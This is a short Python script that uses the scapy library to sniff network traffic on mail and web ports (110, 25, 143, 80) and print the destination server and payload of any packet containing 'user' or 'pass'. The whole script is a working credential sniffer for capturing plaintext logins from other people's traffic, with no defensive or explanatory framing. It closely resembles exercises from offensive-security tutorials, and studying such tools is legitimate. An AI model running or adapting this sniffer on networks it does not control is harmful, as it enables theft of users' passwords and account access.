#!/usr/bin/python

from scapy.all import *
gverbose = True


def vprint(verbose_string, lverbose=False):
    '''
        Enables verbose printing with a custom line icon in brackets.
    '''
    global gverbose
    if lverbose or gverbose:
        if gverbose is True:
            icon = '*'
        else:
            icon = '[{}]'.format(lverbose)
        print('{} {}'.format(icon, verbose_string))


def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            vprint('Server: {svr}'.format(svr=packet[IP].dst))
            vprint('Server: {pld}'.format(pld=packet[TCP].payload))


sniff(
    filter='tcp port 110 or tcp port 25 or tcp port 143 or tcp port 80',
    prn=packet_callback,
    count=20,
    store=0)
